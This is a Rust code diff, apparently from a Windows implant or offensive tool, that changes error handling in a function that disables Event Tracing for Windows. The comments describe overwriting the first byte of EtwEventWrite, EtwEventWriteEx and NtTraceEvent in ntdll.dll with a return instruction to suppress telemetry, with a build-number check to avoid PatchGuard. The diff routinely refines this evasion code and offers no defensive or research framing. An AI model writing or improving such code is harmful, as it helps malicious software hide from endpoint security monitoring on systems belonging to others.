@@ -336,13 +336,13 @@ unsafe fn peb_build_number() -> Option<u32> {
 /// Modifies executable code in the running process.  Must only be called once,
 /// on Windows x86-64, before ETW-instrumented code executes.
 #[cfg(windows)]
-pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) {
+pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow::Result<()> {
     use common::config::EtwPatchMode;
 
     match mode {
         EtwPatchMode::Never => {
             log::debug!("etw_patch: mode=never; ETW patch skipped");
-            return;
+            return Ok(());
         }
         EtwPatchMode::Safe => {
             // SAFETY: PEB read only; no memory modification here.
@@ -356,7 +356,7 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) {
                         build,
                         PATCHGUARD_ETW_BUILD_THRESHOLD,
                     );
-                    return;
+                    return Ok(());
                 }
                 log::debug!("etw_patch: Windows build {} < {}; applying ETW patch", build, PATCHGUARD_ETW_BUILD_THRESHOLD);
             } else {
@@ -374,12 +374,13 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) {
     if patched {
         log::debug!("etw_patch: ETW functions patched successfully");
     } else {
-        log::warn!("etw_patch: patch_etw returned false; no functions were patched");
+        return Err(anyhow::anyhow!("ETW patch verification failed: no functions were patched"));
     }
+    Ok(())
 }
 
 #[cfg(not(windows))]
-pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) {}
+pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) -> anyhow::Result<()> { Ok(()) }
 
 /// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll
 /// by overwriting their first byte with `ret` (0xC3), suppressing ETW telemetry.
@@ -396,7 +397,7 @@ pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) {}
 #[cfg(windows)]
 pub unsafe fn patch_etw() {
     // Default to `safe` mode when called without an explicit mode.
-    patch_etw_with_mode(common::config::EtwPatchMode::Safe);
+    let _ = patch_etw_with_mode(common::config::EtwPatchMode::Safe);
 }
 
 #[cfg(not(windows))]
